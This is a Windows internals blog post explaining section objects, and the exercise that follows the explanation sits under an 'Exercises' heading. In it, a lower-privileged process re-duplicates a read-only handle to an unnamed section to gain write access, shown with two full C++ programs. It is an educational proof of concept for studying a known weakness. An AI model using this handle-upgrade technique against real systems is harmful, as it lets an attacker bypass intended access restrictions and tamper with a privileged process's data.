---
title: Securing Sections
slug: securing-sections
publishDate: 06 June 2026
description: In this post we will go over sections, what they are, different types of sections and how they can be secured.
tags: ['windows', 'exercises']
---

<img
  src="/assets/blog/exercise-1-securing-sections.png"
  alt="Illustration of securing sections"
  style="display: block; margin: 0 auto; max-width: 350px; width: 100%; height: auto;"
/>

## <a name="top"></a> Table of Contents

- [What are sections?](#what-are-sections)
- [Types of sections](#types-of-sections)
- [Exercises](#exercises)

---

# <a name="what-are-sections"></a>What Are Sections?

Sections in Windows are sections of memory that processes can share with each other, proceses can use this to create sections which have data that can be accessed by other processes in different ways. It could be made it so that only some processes are allowed to write to it while others can read from it.

Read more: [section objects and views](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views)

---

# <a name="types-of-sections"></a>Types of Sections

There are mainly two types of sections:
- File-backed sections
- Page-file-backed sections

Let's go over both of them.

## File-backed Sections

When we create a section object, we have the option to pass a handle to a file, if passed, that file will be used as the backend to the memory section, meaning, the data read from the section is the actual data stored in the file and any data written to it will be reflected in the file as well. Using this we can create sections whose data stays persistent even after system reboots.

Here's the API call for *NtCreateSectionEx (ntifs.h)*

```cpp
__kernel_entry NTSYSCALLAPI NTSTATUS NtCreateSectionEx(
  [out]          PHANDLE                 SectionHandle,
  [in]           ACCESS_MASK             DesiredAccess,
  [in, optional] POBJECT_ATTRIBUTES      ObjectAttributes,
  [in, optional] PLARGE_INTEGER          MaximumSize,
  [in]           ULONG                   SectionPageProtection,
  [in]           ULONG                   AllocationAttributes,
  [in, optional] HANDLE                  FileHandle,
  [in/out]       PMEM_EXTENDED_PARAMETER ExtendedParameters,
                 ULONG                   ExtendedParameterCount
);
```

See that the parameter *FileHandle* of type `HANDLE` is marked as **optional**.

Read more: [NtCreateSectionEx](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesectionex)

## Page-file-backed Sections

In the last section, we discussed the case where we pass a *FileHandle* while creating a section object, but happens when we pass it as *NULL*? That will end up creating a section that is backed by just memory pages/page-files, on a typical windows installation that is *C:\pagefile.sys*. This means that your data won't persist the reboot.

---

# <a name="exercises"></a>Exercises

The other day I was reading James Forshaw's first Project Zero [blog post](https://projectzero.google/2014/10/did-man-with-no-name-feel-insecure.html) in which he explains how many unnamed objects have no security including sections, meaning it is not a securable object and so it does not have a [security descriptor](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors).

I found it very cool and wanted to test this out for myself. So let's get started.

## Exercise 1: Privesc to write data to a section

1. Create a privileged process (Process A) and a lesser privileged process (Process B).
2. Process A will then:
    1. Create an anonymous (unnamed) section with `PAGE_READWRITE` page protection.
    2. Map it as `FILE_MAP_ALL_ACCESS`.
    3. Write some data to it.
    4. Get the pid for process B from the user.
    5. Open the handle to process B.
    6. Duplicate the section handle to process B with access level as `FILE_MAP_READ`.
    7. Wait for process B to privesc and write to the section.
    8. Read from the section.
3. Now onto process B, it will:
    1. Print the pid of the process that we can give to process A.
    2. Take the duplicated handle we got from process A through user input.
    3. Duplicate the handle once again to get write privileges as well.
    4. Map the duplicated handle to the current process.
    5. Change the data inside the section.

**IMPORTANT**: Try implementing this yourself before moving onto the source code.

### Source code

#### Process A (privileged)

```cpp
#include <Windows.h>
#include <iostream>

int main() {
    
    // TODO: add a check to ensure process is running as admin, return if not.
    // step 1: create an anonymous section
    HANDLE hSection = CreateFileMappingW(INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 4096, nullptr);
    if (hSection == nullptr) {
        std::cerr << "Failed to create file mapping: " << GetLastError() << std::endl;
        return 1;
    }

    // step 2: map the section into the current process
    LPVOID pMapView = MapViewOfFile(hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (pMapView == nullptr) {
        std::cerr << "Failed to map view of file: " << GetLastError() << std::endl;
        CloseHandle(hSection);
        return 1;
    }

    // step 3: write some data to the section
    const char* message = "Hello from the privileged process!";
    memcpy(pMapView, message, strlen(message) + 1);
    std::cout << "Data written to the section successfully! \"" << message << "\"" << std::endl;

    // step 4: read data back from the section to verify it's correct
    char buffer[256];
    memcpy(buffer, pMapView, sizeof(buffer));
    // std::cout << "Data read from the section: " << buffer << std::endl;

    // step 5: get the low privileged process pid from user input
    DWORD dwPid;
    std::cout << "\nEnter the PID of the low privileged process: ";
    std::cin >> dwPid;

    // step 6: open a handle to the low privileged process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (hProcess == nullptr) {
        std::cerr << "Failed to open process: " << GetLastError() << std::endl;
        UnmapViewOfFile(pMapView);
        CloseHandle(hSection);
        return 1;
    }
    // std::cout << "Handle to target process opened successfully!" << std::endl;

    // step 7: duplicate a read-only handle to a less privileged process
    HANDLE hTargetHandle = nullptr;
    BOOL bDuplicate = DuplicateHandle(GetCurrentProcess(), hSection, hProcess, &hTargetHandle, FILE_MAP_READ, FALSE, 0);
    if (!bDuplicate) {
        std::cerr << "Failed to duplicate handle: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        UnmapViewOfFile(pMapView);
        CloseHandle(hSection);
        return 1;
    }
    std::cout << "Handle duplicated successfully! Handle: " << hTargetHandle << std::endl;

    std::cout << "Enter any key to read data from the section..." << std::endl;
    std::cin.get(); // wait for user input before reading data back
    std::cin.get();
    // step 8: read data back from the section to verify it's correct
    char buffer2[256];
    memcpy(buffer2, pMapView, sizeof(buffer2));
    std::cout << "Updated data by lesser privileged process: " << buffer2 << std::endl;

    return 0;
}
```

#### Process B (normal user)

```cpp
#include <Windows.h>
#include <iostream>

int main() {
    
    std::cout << "PID of the current process: " << GetCurrentProcessId() << std::endl;
    
    // step 1: get the handle value of the duplicated handle from user input
    DWORD dwReadOnlyHandleId;
    std::cout << "Please enter the value of the duplicated handle: " << std::endl;
    std::cin >> std::hex >> dwReadOnlyHandleId;
    HANDLE hReadOnlyHandle = (HANDLE)dwReadOnlyHandleId;
    // std::cout << "Handle value entered: " << hReadOnlyHandle << std::endl;

    // step 2: duplicate the handle to the current process with read/write access
    HANDLE hCurrentProcess = GetCurrentProcess();
    HANDLE hUpgradedHandle = nullptr;
    BOOL bDuplicate = DuplicateHandle(hCurrentProcess, hReadOnlyHandle, hCurrentProcess, &hUpgradedHandle, FILE_MAP_READ | FILE_MAP_WRITE, FALSE, 0);
    if (!bDuplicate) {
        std::cerr << "Failed to duplicate handle: " << GetLastError() << std::endl;
        return 1;
    }

    // step 3: map the duplicated handle into the current process
    LPVOID pMapView = MapViewOfFile(hUpgradedHandle, FILE_MAP_WRITE, 0, 0, 0);
    if (pMapView == nullptr) {
        std::cerr << "Failed to map view of file: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "Mapped view of file successfully!" << std::endl;

    // step 4: write some data to the section
    const char* message = "Hello from the lesser privileged process!";
    memcpy(pMapView, message, strlen(message) + 1);
    std::cout << "Data written to the section successfully! \"" << message << "\"" << std::endl;

    // step 5: read data back from the section to verify it's correct
    // char buffer[256];
    // memcpy(buffer, pMapView, sizeof(buffer));
    // std::cout << "Data read from the section: " << buffer << std::endl;

    return 0;
}
```

### Result

#### Process A (privileged)

![Process A (privileged)](/assets/blog/windows/exercises/securing-sections-process-a.png)

#### Process B (normal user)

![Process B (normal user)](/assets/blog/windows/exercises/securing-sections-process-b.png)

As you can see the lesser privileged process was able to duplicate the handle to gain write privileges and modify the contents of the section.

---

